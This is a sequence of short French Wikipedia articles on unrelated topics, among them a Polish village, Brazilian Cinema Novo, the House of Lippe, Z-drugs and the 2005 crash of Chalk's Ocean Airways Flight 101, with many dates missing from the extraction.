Biskupice (prononciation : ) est un village polonais de la gmina de Brwinów dans le powiat de Pruszków de la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ 4 kilomètres au nord-ouest de Brwinów (siège de la "gmina"), 8 kilomètres à l'ouest de Pruszków (siège du "powiat") et à 23 kilomètres à l'ouest de Varsovie (capitale de la Pologne).
Le village compte approximativement une population de 231 habitants en 2012.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Varsovie.

</doc>
<doc id="8731257" url="https://fr.wikipedia.org/wiki?curid=8731257" title="Renault Vivasport">
Renault Vivasport



</doc>
<doc id="8731272" url="https://fr.wikipedia.org/wiki?curid=8731272" title="The House of Sand">
The House of Sand



</doc>
<doc id="8731358" url="https://fr.wikipedia.org/wiki?curid=8731358" title="Drancy Avenir (film)">
Drancy Avenir (film)

Drancy Avenir est un documentaire français réalisé par Arnaud des Pallières, sorti en 1997.

</doc>
<doc id="8731362" url="https://fr.wikipedia.org/wiki?curid=8731362" title="Cinema Novo">
Cinema Novo

Cinema Novo est un mouvement cinématographique brésilien auquel appartenaient plusieurs réalisateurs brésiliens des années 1950 et 1960 qui a d'abord été influencé par le néoréalisme italien puis la Nouvelle Vague française. 
Les membres les plus représentatifs du "cinema novo" sont Glauber Rocha, Nelson Pereira dos Santos, Carlos Diegues et Joaquim Pedro de Andrade rejoints ensuite par Walter Lima Júnior et Ruy Guerra. Leurs films représentent la réalité sociale du pays, son passé historique ainsi que la pauvreté, à la fois dans les grandes villes et dans la désolation du Nordeste. Ils sont en rupture avec les films grandiloquents sur le thème du carnaval et des comédies paysannes qui résumaient la production cinématographique brésilienne avant les années 1950 à cause de la concurrence du cinéma des États-Unis. Ils créent même une société de production Difilm qui va très bien marcher. 
Son influence touche toujours le cinéma brésilien actuel et est palpable dans des films comme "Central do Brasil" de Walter Salles (1998) ou de "La Cité de Dieu" () de Fernando Meirelles (2002).

</doc>
<doc id="8731364" url="https://fr.wikipedia.org/wiki?curid=8731364" title="Cristóbal de Castillejo">
Cristóbal de Castillejo

Cristóbal de Castillejo (Ciudad Rodrigo, 1494 - Vienne, 1550) est un poète et auteur dramatique espagnol.
Biographie.
Page de Ferdinand (1509), frère de Charles Quint, cistercien au couvent San Martín de Valdeiglesias, il devient son secrétaire (1525) lorsque celui-ci est proclamé roi de Hongrie et de Bohême (1526) puis empereur (1531). Il reste de nombreuses années en Allemagne puis devient chartreux à Vienne. 
Il fut un des plus vifs adversaires des innovations de l'école de Boscan.

</doc>
<doc id="8731372" url="https://fr.wikipedia.org/wiki?curid=8731372" title="Lenore Zann">
Lenore Zann

Lenore Zann, née le à Sydney en Australie, est une actrice et femme politique canadienne.
Biographie.
Elle est députée néo-démocrate de à l'Assemblée législative de la Nouvelle-Écosse de l'élection néo-écossaise de 2009 au , puis elle représente sa circonscription en tant qu'indépendante jusqu'au .
Aux élections fédérales de 2019, elle est la candidate libérale élue dans Cumberland—Colchester. 

</doc>
<doc id="8731374" url="https://fr.wikipedia.org/wiki?curid=8731374" title="Only One (chanson de Kanye West)">
Only One (chanson de Kanye West)

Only One est une chanson du rappeur américain Kanye West en duo avec Paul McCartney, sortie en .
Clip vidéo.
Le , Kanye West dévoile un extrait du clip dans l'émission télévisée "The Ellen DeGeneres Show". Le clip est réalisé par Spike Jonze. Il montre Kanye West se baladant en forêt avec sa fille North.

</doc>
<doc id="8731375" url="https://fr.wikipedia.org/wiki?curid=8731375" title="Only One">
Only One



</doc>
<doc id="8731381" url="https://fr.wikipedia.org/wiki?curid=8731381" title="Pays Midi Quercy">
Pays Midi Quercy



</doc>
<doc id="8731398" url="https://fr.wikipedia.org/wiki?curid=8731398" title="Walter Lima Jr.">
Walter Lima Jr.

Walter Lima Jr., né à Rio de Janeiro (Brésil) le , est un réalisateur et scénariste brésilien.
Son film "Brasil Ano 2000" (1969) a remporté l'Ours d'argent au Festival international du film de Berlin.

</doc>
<doc id="8731403" url="https://fr.wikipedia.org/wiki?curid=8731403" title="Erkki Huttunen">
Erkki Huttunen

Erkki Huttunen (né le à Alavus, décédé le à Helsinki) est un architecte représentant le Fonctionnalisme.
Biographie.
Erkki Huttunen étudie au lycée finnois d'Helsinki et obtient son baccalauréat en 1921.
Il étudie ensuite à l'Université technologique d'Helsinki et obtient son diplôme d'architecte le 17 décembre 1927.
En même temps que ses études à TKK, il étudie aussi le dessin et la peinture.
Il travaille aussi comme illustrateur et caricaturiste pour de nombreux quotidiens.
Erkki Huttunen fait des voyages d'étude dans de nombreux pays européens, par exemple en Italie, en France, en Grèce, en Grande-Bretagne et aux États-Unis.
En janvier 1928, il est recruté comme dessinateur pour le service de la construction de la SOK.
Le chef du département était à cette époque l'architecte Valde Aulanko.
Les premières œuvres d'Erkki Huttunen ont encore un style classique, c'est le cas par exemple du moulin de Toppila à Oulu conçu en 1928.
En 1930, les immeubles de bureaux des moulins de Rauma et de Viipuri sont déjà clairement représentatifs du style fonctionnaliste.
De 1939 à 1941, Erkki Huttunen est nommé directeur du département de la construction de la SOK et en 1943, il est nommé directeur général de la construction.
Les tâches administratives de directeur général prennent une grande partie de son temps de travail.
Il a également son propre bureau d'architecte de 1931 à 1956.
Sa fonction de directeur général prend fin en 1953, quand il est remplacé par l'architecte Jussi Lappi-Seppälä.
Ouvrages principaux.
Erkki Huttunen a conçu de très nombreux bâtiments publics ou d'entreprises dans toute la Finlande.
Il a participé à de nombreux concours d'architectes comme la Mairie de Kotka ou l'église de Nakkila.
Ses ouvrages les plus connus sont les bâtiments fonctionnalistes de la SOK à Rauma, Kotka, Joensuu, Oulu et Vaasa et les moulins d'Oulu, Nokia et de Viipuri.
Parmi ses grands ouvrages on peut citer l'usine d'Alko à Rajamäki, la Mairie et la pharmacie de Lauritsala.
Prix et récompenses.
En 1937, Erkki Huttunen reçoit la médaille d'or de l'Exposition universelle de 1937 à Paris.
Bibliographie.
 
Liens externes.
 

</doc>
<doc id="8731404" url="https://fr.wikipedia.org/wiki?curid=8731404" title="Ancienne route du sel">
Ancienne route du sel



</doc>
<doc id="8731420" url="https://fr.wikipedia.org/wiki?curid=8731420" title="Walter Lima Júnior">
Walter Lima Júnior



</doc>
<doc id="8731449" url="https://fr.wikipedia.org/wiki?curid=8731449" title="Carlos Loyzaga">
Carlos Loyzaga

Carlos Loyzaga, né le , à Manille, aux Philippines et mort le à San Juan, aux Philippines, est un joueur et entraîneur philippin de basket-ball. Il évolue durant sa carrière au poste de pivot.
Biographie.
Mort.
Carlos Loyzaga meurt le d'un arrêt cardiaque à San Juan (Philippines).

</doc>
<doc id="8731453" url="https://fr.wikipedia.org/wiki?curid=8731453" title="Yōkai Watch 2">
Yōkai Watch 2



</doc>
<doc id="8731466" url="https://fr.wikipedia.org/wiki?curid=8731466" title="Tchéquie au Concours Eurovision de la chanson 2015">
Tchéquie au Concours Eurovision de la chanson 2015

La Tchéquie a annoncé sa participation au Concours Eurovision de la chanson 2015 à Vienne, en Autriche le , revenant ainsi au Concours après cinq ans d'absence.
Sélection.
Les chanteurs Marta Jandová et Václav Noid Bárta, représentants de la Tchéquie au Concours Eurovision de la chanson sont présentés le à la suite d'une sélection interne. Ils interpréteront une chanson intitulée "Hope never dies", présentée le , sur la scène du Concours.
À l'Eurovision.
La Tchéquie participa à la seconde demi-finale. Elle y termine avec , ce qui ne lui permet pas de se qualifier en finale.

</doc>
<doc id="8731487" url="https://fr.wikipedia.org/wiki?curid=8731487" title="Église Saint-Germain de Branville">
Église Saint-Germain de Branville

Léglise Saint-Germain est une église catholique située à Branville, en France. Elle est inscrite au titre des Monuments historiques.
Localisation.
L'église est située dans le département français du Calvados, à l'ouest du bourg de Branville.
Historique.
L'édifice est inscrit au titre des Monuments historiques depuis le .

</doc>
<doc id="8731490" url="https://fr.wikipedia.org/wiki?curid=8731490" title="Art Mardigan">
Art Mardigan

Art Mardigan, de son vrai nom Arthur Mardigian, né le à Détroit dans le Michigan et mort dans la même ville le , est un batteur de jazz américain.
Biographie.
De 1943 à 1944, Art Mardigan joue dans le big band de Tommy Reynolds. Après la guerre, et le service militaire, il vit à New York où il joue avec Georgie Auld, Allen Eager, et de nombreux boppers, Charlie Parker, Fats Navarro, Kai Winding, Wardell Gray ou Dexter Gordon.
Dans les années 1950, on le retrouve dans les grands orchestres de Woody Herman et Pete Rugolo. Il joue et enregistre avec des petites formations, aux côtés notamment d'Al Cohn, par exemple pour l'unique album de Nick Travis en 1954. Il quittera New York pour revenir à Détroit, sa ville natale.

</doc>
<doc id="8731500" url="https://fr.wikipedia.org/wiki?curid=8731500" title="Maison de Lippe">
Maison de Lippe

La maison de Lippe est une maison princière, souveraine de la Principauté de Lippe.
Histoire.
Le fondateur de la future principauté de Lippe est , qui reçoit en une partie du territoire de Lothaire de Supplinbourg, empereur germanique et roi des Romains. Bernard relève dès lors le titre de « seigneur de Lippe ». Les successeurs de Bernard héritent et obtiennent plusieurs comtés. En , est le premier souverain de Lippe à porter le titre de comte du Saint-Empire.
Après la mort de en , la seigneurie de Lippe est divisée en comtés dirigés distinctement par ses quatre fils survivants : 
En , à la mort sans descendant masculin, de Louis-Ferdinand de Lippe-Brake, le comté de Lippe-Brake est réuni à la ligne principale de Detmold.
Une autre branche de la famille est fondée en par Jobst Herman, un fils cadet de , qui devient le fondateur de la ligne Lippe-Biesterfeld qui cependant ne règne pas comme souveraine, à l'exception du dernier prince de Lippe, (-), né comte de Lippe-Biesterfeld, qui hérite du trône en après que la lignée de Detmold s'est éteinte.
Une autre branche, fondée par Ferdinand de Lippe-Biesterfeld en , toujours existante, est celle de Lippe-Weissenfeld, élevée au rang des princes au début du , qui est une branche cadette des Lippe-Biesterfeld. En , le prince Bernhard de Lippe-Biesterfeld, neveu du prince , devient le prince consort de la reine Juliana des Pays-Bas.
Les comtes de Lippe-Detmold obtiennent le titre de prince du Saint-Empire en , en la personne de . Peu de temps après être devenue un État membre de l'Empire allemand en , la ligne princière de Lippe-Detmold s'est éteinte le .
Il en est résulté un conflit d'héritage entre la principauté voisine de Schaumburg-Lippe (possédée par l'ancienne ligne Lippe-Alverdissen) et la ligne cadette de Lippe-Biesterfeld. La dispute a été résolue par la cour impériale à Leipzig en : la souveraineté de la principauté passant à la ligne de Lippe Biesterfeld - contrairement au désir de l'empereur qui aurait préféré son beau-frère Adolphe de Schaumbourg-Lippe, un prince cadet de sa maison, comme souverain à Detmold.
La principauté de Lippe existe jusqu'au , lors de l'abdication de , et devient, dès lors, un état libre sous la forme d'une république fédérée jusqu'en . En , la Lippe est intégrée dans l'état de Rhénanie-du-Nord-Westphalie. Le prince Stéphane de Lippe, chef de la maison depuis , est toujours propriétaire du domaine et du château de Detmold.
Liste des souverains de Lippe.
Seigneurs de Lippe (1123-1528).
Fin de la seigneurie et fondation du comté en .
Comtes de Lippe-Detmold (1613-1789).
Fin du comté et fondation de la principauté en .
Princes de Lippe (1789-1918).
Maison de Lippe-Biesterfeld.
Fin de la principauté et fondation de l'État en .

</doc>
<doc id="8731502" url="https://fr.wikipedia.org/wiki?curid=8731502" title="Alfonso Marquez">
Alfonso Marquez

Alfonso R. Marquez, surnommé Boy, né le à Zamboanga City aux Philippines et mort le , est un joueur et entraîneur philippin de basket-ball.

</doc>
<doc id="8731504" url="https://fr.wikipedia.org/wiki?curid=8731504" title="Nonbenzodiazépines">
Nonbenzodiazépines



</doc>
<doc id="8731508" url="https://fr.wikipedia.org/wiki?curid=8731508" title="Charles Lemanceau">
Charles Lemanceau

Charles Lemanceau, né le dans le et mort le à Trébeurden, est un sculpteur et céramiste français connu notamment pour son bestiaire en grès, en porcelaine et en faïence craquelée art déco.
Biographie.
Né à Paris, Charles Lemanceau y fait ses études. Il est diplômé de l'école des arts appliqués et de l'École nationale supérieure des arts décoratifs en 1923 après avoir été reçu à l'école Estienne et à l'école Boulle. Dès 1923, dans le sillage du mouvement L'Art pour tous lancé par Victor Prouvé, il travaille pour les ateliers d'art du Printemps "Primavera" et à travers ses créations pour la faïencerie de Saint-Clément ainsi que pour la faïencerie de Sainte-Radegonde ou encore pour les établissements Louis Lourioux.
En 1925, il expose au Salon d'automne en compagnie de Robert Mallet-Stevens, Le Corbusier, Henri Matisse... Pendant son service militaire il sculpte le buste d'Ambroise Paré pour le Val de Grâce. Il ouvre ensuite un atelier à Paris en 1928 : il y réalisera le monument funéraire de Louis Lourioux. En 1929, il remporte le concours ROBJ avec un "Nu décoratif en grandeur nature". Il sculpte aussi en 1930 une gazelle pour La Maîtrise, atelier d'art des Galeries Lafayette, des biches en 1929, des lévriers pour Pomone, l'atelier d'art du Bon Marché, et un chat pour Manufrance en 1931. Il est en effet spécialement reconnu pour son bestiaire en émail craquelé et est réputé pour la stylisation de formes animales.
En 1933, il rejoint La Ruche et y restera jusqu'à sa retraite en 1967.
Il enseigne à partir de 1943 aux ateliers-école de la Chambre de commerce et d'industrie de région Paris - Île-de-France, actuellement dénommés « ateliers Grégoire », sous la direction d'Aristide Lomont. Grâce à sa notoriété, il bénéficiera de commandes publiques dont le tympan d'une église à Vitré en 1943 ou le monument aux morts de Lanvollon en 1947.

</doc>
<doc id="8731509" url="https://fr.wikipedia.org/wiki?curid=8731509" title="All Directions">
All Directions

All Directions est un album de The Temptations produit par Norman Whitfield, sorti en 1972.
L'album.
Le titre "Papa Was a Rollin' Stone" permet au groupe de gagner trois Grammy Awards en 1973 dont le Grammy Award de la meilleure prestation R&amp;B par un duo ou un groupe avec chant. Il atteint la du Billboard 200 et la en catégorie R&amp;B. L'album fait partie des 1001 albums qu'il faut avoir écoutés dans sa vie. 

</doc>
<doc id="8731513" url="https://fr.wikipedia.org/wiki?curid=8731513" title="Joaquín Rojas">
Joaquín Rojas

Joaquín Rojas, né le , est un ancien joueur philippin de basket-ball.

</doc>
<doc id="8731516" url="https://fr.wikipedia.org/wiki?curid=8731516" title="Charles lemanceau">
Charles lemanceau



</doc>
<doc id="8731524" url="https://fr.wikipedia.org/wiki?curid=8731524" title="Orlando Bauzon">
Orlando Bauzon

Orlando Bauzon, né le à Calasiao (Philippines) et mort le à Quezon City (Philippines), est un joueur philippin de basket-ball.

</doc>
<doc id="8731526" url="https://fr.wikipedia.org/wiki?curid=8731526" title="HATS-5 b">
HATS-5 b

 est une planète extrasolaire (exoplanète) confirmée en orbite autour de , une étoile de type spectral G, âgée d'environ 3,6 milliards d'années et située à une distance d'environ du Soleil, dans la direction de la constellation australe de l'Éridan.
Sa découverte par la méthode des transits a été annoncée en 2014.
Avec une vraie masse de moins d'un quart de masse jovienne () pour un rayon avoisinant celui de Jupiter (), serait une planète géante gazeuse de faible masse volumique () et à la température d'équilibre élevée ().
 révolutionne autour de son étoile en moins de cinq jours () et à la distance moyenne de , sur une orbite elliptique presque circulaire (excentricité de ) et dont le plan est presque perpendiculaire (inclinaison de ) par rapport à l'équateur de son étoile.

</doc>
<doc id="8731533" url="https://fr.wikipedia.org/wiki?curid=8731533" title="Renato Reyes">
Renato Reyes

Renato Reyes, né le et décédé le , est un ancien joueur philippin de basket-ball.

</doc>
<doc id="8731537" url="https://fr.wikipedia.org/wiki?curid=8731537" title="Championnat du Gabon de football 1981">
Championnat du Gabon de football 1981

La saison 1981 du Championnat du Gabon de football est la cinquième édition du championnat de première division gabonaise, le "Championnat National". La compétition est en fait une phase finale qui réunit les dix clubs issus des championnats provinciaux. L’ensemble des rencontres ont lieu dans la capitale, Libreville.
C'est le tenant du titre, l’USM Libreville qui remporte à nouveau le titre, après avoir battu le FC 105 Libreville lors de la finale nationale. C'est le second titre de champion du Gabon de l'histoire du club.

</doc>
<doc id="8731539" url="https://fr.wikipedia.org/wiki?curid=8731539" title="Elias Tolentino">
Elias Tolentino

Elias Tolentino, né le et mort le , est un joueur philippin de basket-ball.

</doc>
<doc id="8731546" url="https://fr.wikipedia.org/wiki?curid=8731546" title="Université de Savoie">
Université de Savoie



</doc>
<doc id="8731549" url="https://fr.wikipedia.org/wiki?curid=8731549" title="Peter Elter">
Peter Elter

Peter Elter, né le à Francfort, est un ancien joueur de tennis allemand, professionnel entre 1976 et 1987.
Carrière.
Il est finaliste du tournoi de Wimbledon junior en 1976 face à Heinz Günthardt.
Après deux demi-finales à Berlin et à Hilversum en 1978, il atteint sa première finale sur le circuit ATP l'année suivante à Bombay où il s'incline face à Vijay Amritraj 6-1, 7-5.
En 1981, il accède à la finale du Classic d'Égypte en ayant battu les têtes de série n°2, 3 et 5 : Balázs Taróczy, Corrado Barazzutti et Paolo Bertolucci. Guillermo Vilas stoppe son beau parcours en deux sets 6-2, 6-3.
En 1982, il participe à la troisième finale de sa carrière à Munich où il est battu en quatre sets par Gene Mayer 3-6, 6-3, 6-2, 6-1. Deux mois plus tard, il est demi-finaliste à Stuttgart.
Il réalise sa dernière performance majeure en atteignant les demi-finales à Munich en 1983. En effet, après ce tournoi, il n'a gagné que 14 matchs pour 27 défaites.
En double, il a été trois fois demi-finaliste et une fois finaliste à Tel Aviv en 1983. Avec Peter Feigl, ils s'inclinent face à Colin Dowdeswell et Zoltan Kuharszky (6-4, 7-5).
Sur le circuit Challenger, il compte un titre en simple à Nairobi en 1984 et un en double à Bielefeld la même année où il a également atteint la finale en simple, tout comme à Travemünde en 1981.
Il a joué huit matchs pour l'équipe d'Allemagne de l'Ouest de Coupe Davis : face à la Suisse et la Hongrie en 1978, face à la Roumanie en 1979 et contre le Brésil en 1981.

</doc>
<doc id="8731550" url="https://fr.wikipedia.org/wiki?curid=8731550" title="Alexandre de Lippe">
Alexandre de Lippe

Alexandre de Lippe (en allemand : "Alexander zur Lippe"), né le à Detmold et mort le à St Gilgenberg, près de Donndorf, est le cinquième et avant-dernier souverain de la principauté de Lippe de 1895 à sa mort. En raison de sa maladie mentale, le pouvoir est exercé par un régent pendant son règne.
Biographie.
Le prince Alexandre de Lippe est le septième enfant de Léopold II et de son épouse la princesse Émilie de Schwarzburg-Sondershausen (1800-1867). Il sert un temps dans un régiment de la garde du royaume de Hanovre. Victime d'une chute de cheval en 1851, il ressent les premiers troubles mentaux qui s'aggravent au fil des années et conduisent en 1871 à son internement au sanatorium de St Gilgenberg, près de Bayreuth. À la mort de son frère aîné Woldemar en 1895, il lui succède comme prince de Lippe. Une régence est instituée, exercée successivement par le prince Adolphe de Schaumbourg-Lippe, puis le prince Ernest de Lippe-Biesterfeld jusqu'à sa mort en 1904, enfin par le fils de ce dernier, Léopold, qui accède au trône en , neuf mois après la mort d'Alexandre.

</doc>
<doc id="8731552" url="https://fr.wikipedia.org/wiki?curid=8731552" title="Non-benzodiazépine">
Non-benzodiazépine

Les non-benzodiazépines ou médicaments Z sont une classe de médicaments qui ont des effets similaires aux benzodiazépines mais dont la structure moléculaire est totalement différente de celle des benzodiazépines. Les benzodiazépines sont une classe de médicaments qui est utilisée pour traiter l'anxiété principalement. Elles sont de loin les plus utilisées en . Les non-benzodiazepines quant à eux sont une classe de médicaments conçus pour traiter l'anxiété et l'insomnie.
Pour lutter contre l'insomnie, les benzodiazépines hypnotiques comme l'estazolam ("Nuctalon") et le lormétazépam ("Noctamide") sont considérés comme moins efficaces que des non-benzodiazépines appelés médicaments Z : le zolpidem ("Stilnox"), le zopiclone ("Imovane") et le zaleplon ("Sonata").
La liste des non-benzodiazépines est longue. Il existe l'étifoxine ("Stresam") et la buspirone qui sont des anxiolytiques.
Mode d'action.
La pharmacodynamique des non-benzodiazépines est pratiquement la même que celle des benzodiazépines. On va donc retrouver les mêmes effets secondaires.

</doc>
<doc id="8731567" url="https://fr.wikipedia.org/wiki?curid=8731567" title="ENSAG">
ENSAG



</doc>
<doc id="8731572" url="https://fr.wikipedia.org/wiki?curid=8731572" title="Belk Bowl 2014">
Belk Bowl 2014

Le Belk Bowl 2014 est un match de football américain de niveau universitaire joué après la saison régulière de 2014, le au Bank of America Stadium à Charlotte en Caroline du Nord.
Il s'agissait de la du Belk Bowl.
Le match a opposé les équipes des Bulldogs de la Géorgie issus de la SEC et des Cardinals de Louisville issue de la ACC.
Il a débuté à 06:36 pm (heure locale) et a été retransmis en télévision sur ESPN.
Sponsorisé par la société Belk (une chaîne de magasins dont le siège se situe à Charlotte), le match est officiellement dénommé le Belk Bowl.
Les Gerogia remportent le match sur le score de 37 à 14.
Présentation du match.
Le match a mis en présence les # 13 Bulldogs de la Géorgie issus de la SEC et les # 21 Cardinals de Louisville issus de la ACC.
Il s'agit de la entre ces deux équipes.
# 13 Bulldogs de la Géorgie.
Avec un bilan global de 9 victoires et 3 défaites, Georgia est éligible et accepte l'invitation pour participer au Belk Bowl de 2014. Ils sont classés à l'issue de la saison régulière #13 au ranking CFP.
Ils terminent de la Eastern Division de la Southeastern Conference derrière #14 Missouri, avec un bilan en conférence de 7 victoires et 1 défaites.
# 21 Cardinals de Louisville.
Avec un bilan global de 9 victoires et 3 défaites, Louisville est éligible et accepte l'invitation pour participer au Belk Bowl de 2014. Ils sont classés à l'issue de la saison régulière #21 au ranking CFP.
Ils terminent de l'Atlantic Division de la Atlantic Coast Conference derrière #5 Florida State et #15 Clemson, avec un bilan en conférence de 5 victoires et 3 défaites.
Il s'agit de leur seconde participation au Belk Bowl puisque avant de rejoindre l'ACC, ils avaient perdu le 31 à 24 contre NC State Wolfpack.

</doc>
<doc id="8731575" url="https://fr.wikipedia.org/wiki?curid=8731575" title="Frank Socolow">
Frank Socolow

Frank Socolow, né le à New York en et mort dans cette même ville le , est un saxophoniste ténor de jazz américain.
Biographie.
Dans les années 1940, Frank Socolow joue dans nombre de big bands, notamment ceux de Georgie Auld et de Boyd Raeburn. Après la guerre, avec l'arrivée du bebop, on le retrouve chez Chubby Jackson ou dans l'orchestre d'Artie Shaw, quand celui-ci s'essaie à un style bopisant. La décennie suivante le voit travailler avec Joe Morello, Buddy DeFranco, Sal Salvador ou Manny Albam.
Socolow a peu enregistré sous son nom. En 1945, une session de quatre titres rassemble Freddie Webster et Bud Powell. En 1956, il enregistre pour Bethlehem,à la tête d'un sextet, son seul album comme leader. 
Style.
Frank Socolow, aux côtés d'autres musiciens new-yorkais, Nick Travis, Osie Johnson, Urbie Green, Milt Hinton, représente un style proche de celui d'Al Cohn et Zoot Sims, une esthétique qui peut se rapprocher de celle du jazz West Coast de Los Angeles.

</doc>
<doc id="8731590" url="https://fr.wikipedia.org/wiki?curid=8731590" title="Lee Jeong-hyeop">
Lee Jeong-hyeop

Lee Jeong-hyeop, Lee Jung-hyup ou encore Lee Jung-hyub (en , "I Jeong-hyeop") est un footballeur sud-coréen évoluant au poste attaquant. 
Biographie.
En même temps qu'il effectue son service militaire au pays, il intègre pour la première fois sa sélection nationale en 2015 lors d'un match amical contre l'Arabie saoudite pendant lequel il inscrit son premier but. 
Il est le sélectionné surprise de l'équipe nationale retenue par le sélectionneur Uli Stielike pour disputer la Coupe d'Asie des nations de football 2015 en Australie. Il inscrit son premier but de compétition lors de la victoire de la Corée du Sud contre le pays hôte. Il trouve également les filets en demi-finale de la Coupe d'Asie face à l'Irak. Dans une compétition réussie par sa sélection, Lee Jeong-hyeop s'impose comme l'une des révélations de l'édition et la principale surprise coréenne.

</doc>
<doc id="8731595" url="https://fr.wikipedia.org/wiki?curid=8731595" title="Lee Jung-hyup">
Lee Jung-hyup



</doc>
<doc id="8731596" url="https://fr.wikipedia.org/wiki?curid=8731596" title="Lee Jung-hyub">
Lee Jung-hyub



</doc>
<doc id="8731598" url="https://fr.wikipedia.org/wiki?curid=8731598" title="Lee Jeong-hyeob">
Lee Jeong-hyeob



</doc>
<doc id="8731599" url="https://fr.wikipedia.org/wiki?curid=8731599" title="Vol Chalk's Ocean Airways 101">
Vol Chalk's Ocean Airways 101

Le , le Grumman G-73 Mallard assurant le vol Chalk's Ocean Airways 101, un vol régulier de passagers qui reliait l'aéroport international de Fort Lauderdale-Hollywood à l', dans les Bahamas, avec une escale prévue à l', s'est écrasé au large de Miami Beach, en Floride. Les 20 passagers et membres d'équipage à bord de ce vol sont tous morts dans l'accident. Il s'agit du seul accident mortel dans l'histoire de Chalk's Ocean Airways, depuis la création de la compagnie aérienne en 1917.
Le Conseil national de la sécurité des transports (NTSB) a pu déterminer que la cause probable de cet accident était la séparation de l'aile droite du fuselage pendant la montée, causée par la fatigue du métal au niveau de l'aile, qui a résulté de l'échec du programme de maintenance de la Chalk's Ocean Airways à identifier et réparer correctement les fissures de fatigue dans l'aile droite, et de l'échec de la Federal Aviation Administration (FAA) à détecter et à corriger les lacunes dans le programme de maintenance de la compagnie aérienne.
Accident.
Le , le vol 101 de la Chalk's Ocean Airways, à destination des Bahamas, s'est écrasé au large de Miami Beach, en Floride. Des témoins présents au moment du drame affirment avoir vu de la fumée blanche s'échapper de l'aile droite de l'avion avant qu'il ne prenne son envol et plonge dans l'océan. 
L'avion s'est écrasé et a coulé dans le chenal maritime de , un cours d'eau qui relie le port de Miami à l'océan Atlantique. Celui-ci été fermé à la navigation jusqu'à le , bloquant au moins trois navires de croisière.
L'appareil impliqué était un Grumman G-73T Turbine Mallard immatriculé N2969 et fabriqué en 1947. Le pilote et le copilote étaient, respectivement, Michele Marques, âgée de 37 ans, vivant à Boynton Beach en Floride, promue commandant de bord un an avant l'accident, et Paul DeSanctis, âgé de 34 ans, vivant à Wyomissing, en Pennsylvanie, qui a rejoint la compagnie aérienne huit mois avant le crash. Le commandant Marques avait de vol à son actif, tandis que le copilote DeSanctis cumulait de vol. Les deux pilotes sont morts dans l'accident.
Le , le NTSB a publié un communiqué de presse qui comprenait des photos montrant la fatigue du métal sur l'aile qui s'est cassée. La découverte de la fatigue du métal dans l'aile a conduit Chalk's Ocean Airways à immobiliser volontairement le reste de sa flotte pour une inspection plus approfondie.
Les enquêteurs, dans leur rapport final sur la cause probable de l'accident, ont noté de nombreux problèmes liés à la maintenance sur l'avion accidenté et sur un autre appartenant à la compagnie, soulevant des questions sur les pratiques de maintenance des avions de Chalk Ocean Airways. Ils ont également déclaré que la FAA n'avait pas détecté et corrigé les lacunes de maintenance de la compagnie aérienne.
Victimes.
Vingt personnes (18 passagers et les deux membres d'équipage) étaient à bord de ce vol. Il n'y a aucun survivant. Trois des passagers étaient des nourrissons âgés de moins de deux ans. Un peu plus de la moitié des passagers sont des habitants des îles Bimini qui revenaient des achats de Noël.
Sergio Danguillecourt, un membre du conseil d'administration de Bacardi (et un arrière-arrière-petit-fils du fondateur de la société), et sa femme, Jacqueline Kriz Danguillecourt, étaient à bord. Sergio Danguillecourt a réussi à défaire sa ceinture de sécurité afin de s'échapper de l'aéronef, et a sauté ou est tombé de l'avion. Son corps a été le dernier à être retrouvé, par un pêcheur près de Key Biscayne, à du lieu de l'accident.
Les corps de tous les autres passagers ont été retrouvés, toujours attachés dans leurs sièges.
Enquête.
Le NTSB a déterminé que la cause probable de l'accident du vol 101 était une défaillance structurelle par fatigue de l'aile droite, initiée par une fissure dans une lisse située près de l'emplanture de l'aile.
Le Grumman G-73 Mallard a été conçu dans les années 1940, avec une aile dite « humide » où les réservoirs de carburant, au lieu d'être des éléments séparés à l'intérieur de l'aile, sont construits à partir de parties scellées de la structure de l'aile elle-même. Cela permet d'éliminer le poids supplémentaire des réservoirs et également de contenir plus de carburant dans une taille d'aile donnée. L'inconvénient de cette forme de construction est que tous les joints autour des coutures du réservoir doivent être scellés, afin de garantir l'étanchéité du réservoir. Grumman, le fabricant de l'avion, avait émis plusieurs avertissements dès 1963 sur le fait que des fuites de carburant au niveau de l'aile pouvait indiqué d'éventuels problèmes structurels. 
L'appareil accidenté souffrait depuis plusieurs mois de fuites répétées de carburant sur les deux ailes, auxquelles l'exploitant avait remédié en appliquant à plusieurs reprises un produit d'étanchéité sur les joints à l'intérieur des réservoirs de carburant. En appliquant le produit d'étanchéité à l'intérieur du réservoir de l'aile droite, les techniciens de maintenance ont appliqué par inadvertance ce produit sur une lisse endommagée (un élément structurel porteur important de l'aile), de manière à masquer une fissure de fatigue. La fissure a été découverte lors d'une opération de maintenance précédente et une tentative a été faite pour la réparer en la ponçant. Pour appliquer le produit d'étanchéité, le technicien a dû accéder à l'intérieur du réservoir de carburant en utilisant de petites trappes d'inspection amovibles sur la surface supérieure de l'aile, entraînant une mauvaise visibilité et des conditions de travail difficiles à l'intérieur du réservoir. Le produit d'étanchéité a masqué la réparation précédente de la lisse et a rendu impossible toute vérification ultérieure de dommages supplémentaires sur ce composant (c'est-à-dire de toute croissance de fissure).
Le premier signe extérieur d'un éventuel problème important sur l'avion accidenté fut la découverte d'une fissure dans le sens de la corde (allant de l'avant de l'aile vers l'arrière) dans le revêtement de la surface inférieure de l'aile droite, au niveau de l'emplanture. Après plusieurs tentatives infructueuses pour colmater la fissure en perçant des trous d'arrêt, la fissure fut réparée à plusieurs reprises en fixant des renforts (pièces métalliques destinées à répartir la charge structurelle de la partie endommagée, une procédure de réparation standard pour les dommages mineurs au revêtement), qui furent rivetés sur le revêtement fissuré. Cependant, la fissure continua de s'agrandir, nécessitant la pose de renforts de plus en plus longs. Bien que la fissure dans le revêtement de l'aile s'allongeait lentement, on ne pensait pas qu'il s'agissait d'autre chose qu'un problème de revêtement, qui pouvait être résolu en fixant des renforts.
Comme la plupart des avions de l'époque, le Mallard a été construit à partir d'une coque en aluminium. Contrairement aux avions antérieurs équipé d'un revêtement en tissu, qui n'avait qu'une fonction aérodynamique et ne contribuait que peu à la résistance globale de la cellule, la coque en aluminium elle-même supporte une partie des charges structurelles en vol et est soumise à des contraintes pendant le vol. De nombreux avions de ce type développent des fissures mineures au fil du temps ; à condition que des mesures appropriées soient prises pour réparer ces fissures, la sécurité de l'avion n'est pas compromise.
